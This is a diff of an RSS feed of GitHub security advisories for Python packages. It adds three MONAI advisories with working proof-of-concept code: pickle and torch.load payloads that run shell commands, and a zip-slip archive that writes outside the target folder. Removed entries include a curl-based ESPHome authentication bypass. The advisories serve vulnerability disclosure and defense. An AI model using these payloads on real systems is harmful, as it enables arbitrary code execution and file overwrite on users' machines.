@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2025-09-09T21:17:19.256Z</updated>
+    <updated>2025-09-09T21:29:00.389Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,283 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[monai] Monai: Unsafe use of Pickle deserialization may lead to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-p8cm-mm2v-gwjm</id>
+        <link href="https://github.com/advisories/GHSA-p8cm-mm2v-gwjm"/>
+        <updated>2025-09-09T21:21:23.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>To prevent this report from being deemed inapplicable or out of scope,  due to the project's unique nature (for medical applications) and widespread popularity (6k+ stars), it's important to pay attention to some of the project's inherent security issues. (This is because medical professionals may not pay enough attention to security issues when using this project, leading to attacks on services or local machines.)</p>
+</blockquote>
+<h3 id="summary">Summary</h3>
+<p>The <code>pickle_operations</code> function in <code>monai/data/utils.py</code> automatically handles dictionary key-value pairs ending with a specific suffix and deserializes them using pickle.loads() . This function also lacks any security measures.</p>
+<p>When verified using the following proof-of-concept, arbitrary code execution can occur.</p>
+<pre><code>#Poc
+from monai.data.utils import pickle_operations  
+
+import pickle  
+import subprocess  
+  
+class MaliciousPayload:  
+    def __reduce__(self):    
+        return (subprocess.call, (['touch', '/tmp/hacker1.txt'],))  
+  
+malicious_data = pickle.dumps(MaliciousPayload())
+
+attack_data = {  
+    'image': 'normal_image_data',  
+    'label_transforms': malicious_data,  
+    'metadata_transforms': malicious_data  
+}
+
+result = pickle_operations(attack_data, is_encode=False)  
+</code></pre>
+<pre><code>#My /tmp directory contents before running the POC
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
+autodl.sh.log selenium-managersXRcjF supervisor.sock supervisord.pid
+</code></pre>
+<p>Before running the command, there was no hacker1.txt content in my /tmp directory, but after running the command, the command was executed, indicating that the attack was successful.</p>
+<pre><code>#Running Poc
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
+autodl.sh.log  selenium-managersXRcjF  supervisor.sock  supervisord.pid
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python r1.py 
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
+autodl.sh.log  hacker1.txt  selenium-managersXRcjF  supervisor.sock  supervisord.pid
+</code></pre>
+<p>The above proof-of-concept is merely a validation of the vulnerability.
+The attacker creates malicious dataset content.</p>
+<pre><code>malicious_data = {
+  'image': normal_image_tensor,
+  'label': normal_label_tensor,
+  'preprocessing_transforms': pickle.dumps(MaliciousPayload()), # Malicious payload
+  'augmentation_transforms': pickle.dumps(MaliciousPayload()) # Multiple attack points
+}
+
+dataset = [malicious_data, ...]
+</code></pre>
+<p>When a user batch-processes data using MONAI's list_data_collate function, the system automatically calls pickle_operations to handle the serialization transformations.</p>
+<pre><code>from monai.data import list_data_collate
+
+dataloader = DataLoader(
+dataset,
+batch_size=4,
+collate_fn=list_data_collate # Trigger the vulnerability
+)
+
+# Automatically execute malicious code while traversing the data
+
+for batch in dataloader:
+
+# Malicious code is executed in pickle_operations
+
+pass
+</code></pre>
+<p>When a user loads a serialized file from an external, untrusted source, the remote code execution (RCE) is triggered.</p>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary code execution</p>
+<h3 id="repair-suggestions">Repair suggestions</h3>
+<p>Verify the data source and content before deserializing, or use a safe deserialization method, which should have a similar fix in huggingface's transformer library.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-p8cm-mm2v-gwjm">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-p8cm-mm2v-gwjm</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58757">https://nvd.nist.gov/vuln/detail/CVE-2025-58757</a></li>
+<li><a href="https://github.com/advisories/GHSA-p8cm-mm2v-gwjm">https://github.com/advisories/GHSA-p8cm-mm2v-gwjm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p8cm-mm2v-gwjm</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-09-09T21:21:23.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[monai] MONAI: Unsafe torch usage may lead to arbitrary code execution]]></title>
+        <id>https://github.com/advisories/GHSA-6vm5-6jv9-rjpj</id>
+        <link href="https://github.com/advisories/GHSA-6vm5-6jv9-rjpj"/>
+        <updated>2025-09-09T21:20:02.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>In <code>model_dict = torch.load(full_path, map_location=torch.device(device), weights_only=True)</code> in monai/bundle/scripts.py , <code>weights_only=True</code> is loaded securely. However, insecure loading methods still exist elsewhere in the project, such as when loading checkpoints.</p>
+<p>This is a common practice when users want to reduce training time and costs by loading pre-trained models downloaded from platforms like huggingface.</p>
+<p>Loading a checkpoint containing malicious content can trigger a deserialization vulnerability, leading to code execution.</p>
+<p>The following proof-of-concept demonstrates the issues that arise when loading insecure checkpoints.</p>
+<pre><code>
+import os  
+import tempfile  
+import json  
+import torch  
+from pathlib import Path  
+  
+class MaliciousPayload:  
+    def __reduce__(self):  
+        return (os.system, ('touch /tmp/hacker2.txt',))  
+  
+def test_checkpoint_loader_attack():  
+
+      
+
+    temp_dir = Path(tempfile.mkdtemp())  
+    checkpoint_file = temp_dir / "malicious_checkpoint.pt"  
+      
+
+    malicious_checkpoint = {  
+        'model_state_dict': MaliciousPayload(),  
+        'optimizer_state_dict': {},  
+        'epoch': 100  
+    }  
+      
+
+    torch.save(malicious_checkpoint, checkpoint_file)  
+      
+     
+    from monai.handlers import CheckpointLoader  
+    import torch.nn as nn  
+          
+ 
+    model = nn.Linear(10, 1)  
+        
+    loader = CheckpointLoader(  
+        load_path=str(checkpoint_file),  
+        load_dict={"model": model}  
+    )  
+          
+    class MockEngine:  
+        def __init__(self):  
+            self.state = type('State', (), {})()  
+            self.state.max_epochs = None  
+            self.state.epoch = 0  
+          
+    engine = MockEngine()  
+    loader(engine)  
+          
+          
+    proof_file = "/tmp/hacker2.txt"  
+    if os.path.exists(proof_file):  
+        print("Succes")  
+        #os.remove(proof_file)  
+        return True  
+    else:  
+        print("False")  
+        return False  
+  
+if __name__ == "__main__":   
+    success = test_checkpoint_loader_attack()  
+</code></pre>
+<p>Because my test environment is missing some content, an error will be reported during operation, but the operation is still executed.</p>
+<pre><code>root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
+autodl.sh.log  checkpoint_pwned.txt  hacker1.txt  selenium-managersXRcjF  supervisor.sock  supervisord.pid  tmpgjp8145d  tmpi3_u3wn8  tmpjvuhwif6  tmpkocoo34q  tmpp3q8occa
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python p2.py 
+Traceback (most recent call last):
+  File "/root/autodl-tmp/mmm/p2.py", line 61, in &lt;module&gt;
+    success = test_checkpoint_loader_attack()  
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/autodl-tmp/mmm/p2.py", line 48, in test_checkpoint_loader_attack
+    loader(engine)  
+    ^^^^^^^^^^^^^^
+  File "/root/miniconda3/lib/python3.12/site-packages/monai/handlers/checkpoint_loader.py", line 146, in __call__
+    Checkpoint.load_objects(to_load=self.load_dict, checkpoint=checkpoint, strict=self.strict)
+  File "/root/miniconda3/lib/python3.12/site-packages/ignite/handlers/checkpoint.py", line 624, in load_objects
+    _tree_apply2(_load_object, to_load, checkpoint_obj)
+  File "/root/miniconda3/lib/python3.12/site-packages/ignite/utils.py", line 209, in _tree_apply2
+    _tree_apply2(func, _CollectionItem.wrap(x, k, v), y[k])
+  File "/root/miniconda3/lib/python3.12/site-packages/ignite/utils.py", line 216, in _tree_apply2
+    return func(x, y)
+           ^^^^^^^^^^
+  File "/root/miniconda3/lib/python3.12/site-packages/ignite/handlers/checkpoint.py", line 613, in _load_object
+    obj.load_state_dict(chkpt_obj, **kwargs)
+  File "/root/miniconda3/lib/python3.12/site-packages/torch/nn/modules/module.py", line 2581, in load_state_dict
+    raise RuntimeError(
+RuntimeError: Error(s) in loading state_dict for Linear:
+        Missing key(s) in state_dict: "weight", "bias". 
+        Unexpected key(s) in state_dict: "model_state_dict", "optimizer_state_dict", "epoch". 
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
+autodl.sh.log  checkpoint_pwned.txt  hacker1.txt  hacker2.txt  selenium-managersXRcjF  supervisor.sock  supervisord.pid  tmpgjp8145d  tmpi02txakb  tmpi3_u3wn8  tmpjvuhwif6  tmpkocoo34q  tmpp3q8occa
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Leading to arbitrary command execution</p>
+<h3 id="fix-suggestion">Fix suggestion</h3>
+<p>Use a safe method to load, or force weights_only=True</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58756">https://nvd.nist.gov/vuln/detail/CVE-2025-58756</a></li>
+<li><a href="https://github.com/advisories/GHSA-6vm5-6jv9-rjpj">https://github.com/advisories/GHSA-6vm5-6jv9-rjpj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6vm5-6jv9-rjpj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-09-09T21:19:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[monai] MONAI does not prevent path traversal, potentially leading to arbitrary file writes]]></title>
+        <id>https://github.com/advisories/GHSA-x6ww-pf9m-m73m</id>
+        <link href="https://github.com/advisories/GHSA-x6ww-pf9m-m73m"/>
+        <updated>2025-09-09T21:19:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The extractall function <code>zip_file.extractall(output_dir)</code> is used directly to process compressed files. It is used in many places in the project. When the Zip file containing malicious content is decompressed, it will overwrite the system files. In addition, the project allows the download of the zip content through the link, which increases the scope of exploitation of this vulnerability.</p>
+<p>When reproducing locally, follow the process below to create a malicious zip file and simulate the process of remotely downloading the zip file.</p>
+<pre><code>root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# mkdir -p test_bundle
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# echo "malicious content" &gt; test_bundle/malicious.txt 
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# cd test_bundle  
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm/test_bundle# zip -r ../malicious.zip . ../../../../../../etc/passwd
+  adding: malicious.txt (stored 0%)
+  adding: ../../../../../../etc/passwd (deflated 64%)
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm/test_bundle# cd ..
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls
+malicious.zip  p1.py  p2.py  r1.py  test_bundle
+</code></pre>
+<p>Then start the http service through python</p>
+<pre><code>root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<p>Another terminal simulates a normal user downloading zip content from the Internet, perhaps from some popular forums or blogs, such as huggingface, etc.</p>
+<pre><code>root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python -c "from monai.bundle.scripts import download; download(name='test_bundle', url='http://localhost:8000/malicious.zip', bundle_dir='/tmp/test_extract')"
+2025-08-11 20:49:01,668 - INFO - --- input summary of monai.bundle.scripts.download ---
+2025-08-11 20:49:01,668 - INFO - &gt; name: 'test_bundle'
+2025-08-11 20:49:01,668 - INFO - &gt; bundle_dir: '/tmp/test_extract'
+2025-08-11 20:49:01,668 - INFO - &gt; source: 'monaihosting'
+2025-08-11 20:49:01,668 - INFO - &gt; url: 'http://localhost:8000/malicious.zip'
+2025-08-11 20:49:01,668 - INFO - &gt; remove_prefix: 'monai_'
+2025-08-11 20:49:01,668 - INFO - &gt; progress: True
+2025-08-11 20:49:01,668 - INFO - ---
+
+
+test_bundle.zip: 8.00kB [00:00, 204kB/s]
+2025-08-11 20:49:01,710 - INFO - Downloaded: /tmp/test_extract/test_bundle.zip
+2025-08-11 20:49:01,710 - INFO - Expected md5 is None, skip md5 check for file /tmp/test_extract/test_bundle.zip.
+2025-08-11 20:49:01,710 - INFO - Writing into directory: /tmp/test_extract.
+2025-08-11 20:49:01,711 - WARNING - metadata file not found in /tmp/test_extract/test_bundle/configs/metadata.json.
+root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /
+autodl-pub  cuda-keyring_1.0-1_all.deb  home  lib32   **malicious.txt**  opt   run   sys  var
+bin         dev                         init  lib64   media          proc  sbin  tmp
+boot        etc                         lib   libx32  mnt            root  srv   usr
+</code></pre>
+<p>We can see that malicious.txt was indeed extracted to the root directory, demonstrating that the path traversal successfully wrote the malicious file.
+If the Zip file contains SSH keys, malicious content that automatically loads when the user boots the computer, or overwrites legitimate user files, causing services to become inoperable, these actions could cause extremely serious damage.</p>
+<h3 id="impact">Impact</h3>
+<p>Arbitrary file write</p>
+<h3 id="repair-suggestions">Repair Suggestions</h3>
+<p>Check the contents of the downloaded Zip file, or use a safer method to load it</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-x6ww-pf9m-m73m">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-x6ww-pf9m-m73m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-58755">https://nvd.nist.gov/vuln/detail/CVE-2025-58755</a></li>
+<li><a href="https://github.com/advisories/GHSA-x6ww-pf9m-m73m">https://github.com/advisories/GHSA-x6ww-pf9m-m73m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-x6ww-pf9m-m73m</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-09-09T21:19:22.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[octoprint] OctoPrint is Vulnerable to RCE Attacks via Unsanitized Filename in File Upload]]></title>
         <id>https://github.com/advisories/GHSA-49mj-x8jp-qvfc</id>
@@ -1184,119 +1461,5 @@ Function for extracting objects from <code>.a</code> — ar_extract</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-09-02T17:12:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[esphome] ESP-IDF web_server basic auth bypass using empty or incomplete Authorization header]]></title>
-        <id>https://github.com/advisories/GHSA-mxh2-ccgj-8635</id>
-        <link href="https://github.com/advisories/GHSA-mxh2-ccgj-8635"/>
-        <updated>2025-09-02T16:46:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>On the ESP-IDF platform, ESPHome's <a href="https://esphome.io/components/web_server.html#configuration-variables"><code>web_server</code> authentication</a> check can pass incorrectly when the client-supplied base64-encoded <code>Authorization</code> value is empty or is a substring of the correct value (e.g., correct username with partial password). This allows access to <code>web_server</code> functionality (including OTA, if enabled) without knowing any information about the correct username or password.</p>
-<h3 id="details">Details</h3>
-<p>The HTTP basic auth check in <code>web_server_idf</code>'s <a href="https://github.com/esphome/esphome/blob/ef2121a215890d46dc1d25ad363611ecadc9e25e/esphome/components/web_server_idf/web_server_idf.cpp#L256"><code>AsyncWebServerRequest::authenticate</code></a> only compares up to <code>auth.value().size() - auth_prefix_len</code> bytes of the base64-encoded <code>user:pass</code> string. This means a client-provided valuer like <code>dXNlcjpz</code> (<code>user:s</code>) will pass the check when the correct value is much longer, e.g., <code>dXNlcjpzb21lcmVhbGx5bG9uZ3Bhc3M=</code> (<code>user:somereallylongpass</code>).</p>
-<p>Furthermore, the check will also pass when the supplied value is the empty string, which removes the need to know (or brute force) the username. A browser won't generally issue such a request, but it can easily be done by manually constructing the <code>Authorizaztion</code> request header (e.g., via <code>curl</code>).</p>
-<h3 id="poc">PoC</h3>
-<p>Configure ESPHome as follows:</p>
-<pre><code class="language-yaml">esp32:
-  board: ...
-  framework:
-    type: esp-idf
-web_server:
-  auth:
-    username: user
-    password: somereallylongpass
-</code></pre>
-<p>In a browser, you can correctly log in by supplying username <code>user</code> and password <code>somereallylongpass</code>... but you can <em>also</em> incorrectly log in by supplying <em>substrings</em> of the password whose base64-encoded digest matches a <em>prefix</em> of the correct digest. (For example, I was able to log into an ESPHome device so configured by supplying password <code>some</code>... or even just <code>s</code>.)</p>
-<p>You can also use a tool like <code>curl</code> to manually set an <code>Authorization</code> request header that <em>always</em> passes the check without any knowledge of the username:</p>
-<pre><code>$ curl -D- http://example.local/
-HTTP/1.1 401 Unauthorized
-...
-
-$ curl -D- -H 'Authorization: Basic ' http://example.local/
-HTTP/1.1 200 OK
-...
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>This vulnerability effectively nullifies basic auth support for the ESP-IDF <code>web_server</code>, allowing auth bypass from another device on the local network with no knowledge of the correct username or password required.</p>
-<h3 id="remediation">Remediation</h3>
-<p>This vulnerability is fixed in 2025.8.1 and later.</p>
-<p>For older versions, disabling the <code>web_server</code> component on ESP-IDF devices may be prudent, particularly if OTA updates through <code>web_server</code> are enabled.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/esphome/esphome/security/advisories/GHSA-mxh2-ccgj-8635">https://github.com/esphome/esphome/security/advisories/GHSA-mxh2-ccgj-8635</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57808">https://nvd.nist.gov/vuln/detail/CVE-2025-57808</a></li>
-<li><a href="https://github.com/esphome/esphome/commit/2aceb56606ec8afec5f49c92e140c8050a6ccbe5">https://github.com/esphome/esphome/commit/2aceb56606ec8afec5f49c92e140c8050a6ccbe5</a></li>
-<li><a href="https://github.com/advisories/GHSA-mxh2-ccgj-8635">https://github.com/advisories/GHSA-mxh2-ccgj-8635</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mxh2-ccgj-8635</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-09-02T16:46:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[local-deep-research] Local Deep Research's API keys are stored in plain text]]></title>
-        <id>https://github.com/advisories/GHSA-4h8c-qrcq-cv5c</id>
-        <link href="https://github.com/advisories/GHSA-4h8c-qrcq-cv5c"/>
-        <updated>2025-09-02T16:38:18.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Affected Versions:</strong> &gt; 0.2.0 and &lt; 1.0.0 
-**Patched Versions:** &gt;= 1.0.0</p>
-<p><strong>Description:</strong>
-The library stored confidential information, including API keys, in a local SQLite database without encryption. This behavior was not clearly documented outside of the database architecture page. Users were not given the ability to configure the database location. As a result, anyone with access to the container or host filesystem could retrieve sensitive data in plaintext by accessing the <code>.db</code> file.</p>
-<p><strong>Impact:</strong>
-Unauthorized access to API keys and other confidential data if the SQLite database file was exposed.</p>
-<p><strong>Fixed in Version 1.0.0:</strong></p>
-<ul>
-<li>Database is fully encrypted</li>
-<li>Database location is configurable  </li>
-<li>API keys can be set via environment variables (this capability existed in earlier versions)</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-4h8c-qrcq-cv5c">https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-4h8c-qrcq-cv5c</a></li>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/pull/578">https://github.com/LearningCircuit/local-deep-research/pull/578</a></li>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/commit/5a9af8e6bec2e0fbaaf9810c1398f5b429588243">https://github.com/LearningCircuit/local-deep-research/commit/5a9af8e6bec2e0fbaaf9810c1398f5b429588243</a></li>
-<li><a href="https://github.com/advisories/GHSA-4h8c-qrcq-cv5c">https://github.com/advisories/GHSA-4h8c-qrcq-cv5c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4h8c-qrcq-cv5c</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-09-02T16:38:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[djangorestframework-simplejwt] Improper Privilege Management in djangorestframework-simplejwt]]></title>
-        <id>https://github.com/advisories/GHSA-5vcc-86wm-547q</id>
-        <link href="https://github.com/advisories/GHSA-5vcc-86wm-547q"/>
-        <updated>2025-09-02T15:26:13.000Z</updated>
-        <content type="html"><![CDATA[<p>djangorestframework-simplejwt before version 5.5.1 is vulnerable to information disclosure. A user can access web application resources even after their account has been disabled due to missing user validation checks via the for_user method.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22513">https://nvd.nist.gov/vuln/detail/CVE-2024-22513</a></li>
-<li><a href="https://github.com/dmdhrumilmistry/CVEs/tree/main/CVE-2024-22513">https://github.com/dmdhrumilmistry/CVEs/tree/main/CVE-2024-22513</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/blob/c791e987332ed5e22a86428160d6372b1d85ffae/rest_framework_simplejwt/tokens.py#L281">https://github.com/jazzband/djangorestframework-simplejwt/blob/c791e987332ed5e22a86428160d6372b1d85ffae/rest_framework_simplejwt/tokens.py#L281</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/issues/779">https://github.com/jazzband/djangorestframework-simplejwt/issues/779</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/pull/872">https://github.com/jazzband/djangorestframework-simplejwt/pull/872</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/pull/873">https://github.com/jazzband/djangorestframework-simplejwt/pull/873</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/pull/891">https://github.com/jazzband/djangorestframework-simplejwt/pull/891</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/commit/14e8b2cf5fa0df954af82ff3926fa6d6c4ecf13e">https://github.com/jazzband/djangorestframework-simplejwt/commit/14e8b2cf5fa0df954af82ff3926fa6d6c4ecf13e</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/commit/1ad763bfe73936515aa4756263338c63866364c9">https://github.com/jazzband/djangorestframework-simplejwt/commit/1ad763bfe73936515aa4756263338c63866364c9</a></li>
-<li><a href="https://github.com/jazzband/djangorestframework-simplejwt/commit/a2d0a0201b6123536ecf76cd4d0ec7389317d0a7">https://github.com/jazzband/djangorestframework-simplejwt/commit/a2d0a0201b6123536ecf76cd4d0ec7389317d0a7</a></li>
-<li><a href="https://github.com/advisories/GHSA-5vcc-86wm-547q">https://github.com/advisories/GHSA-5vcc-86wm-547q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5vcc-86wm-547q</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-03-16T09:30:35.000Z</published>
     </entry>
 </feed>
